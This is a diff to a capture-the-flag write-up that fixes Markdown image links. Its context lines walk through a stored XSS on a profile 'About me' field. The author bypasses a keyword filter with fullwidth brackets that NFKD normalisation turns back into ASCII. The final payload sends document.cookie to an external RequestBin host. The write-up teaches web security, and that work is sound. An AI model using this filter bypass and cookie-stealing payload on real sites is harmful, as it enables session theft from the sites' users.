@@ -16,9 +16,9 @@ Visiting `/devchat` instead shows us messages between developers, which give us 
 </ol>
 
 To test our idea of the XSS, we can register an account, log into it and view our profile page. After entering `" hidden value="` into the "About me" field and updating our information, we see that the field disappears:
-[!About me field is gone](disap.png)
+![About me field is gone](disap.png)
 However, if we try to enter `<script>`, we see that the website detects a "hacking attempt":
-[!Hacking attempt](hackattempt.png)
+![Hacking attempt](hackattempt.png)
 Not only does this occur for the angle brackets but also simply the string "script". This is where our knowledge of the NFKD normalisation algorithm comes from: we can enter a string which has alternative "Unicode" versions of the angle brackets and one of the letters of "script" to bypass the XSS detection and then have the payload be decomposed with NFKD. Our final payload looks like this (I used RequestBin as the proxy):
 ```
 "＞＜scᴿipt＞ fetch(`https://[my_bin].x.pipedream.net/c=${document.cookie}`)＜/scᴿipt＞
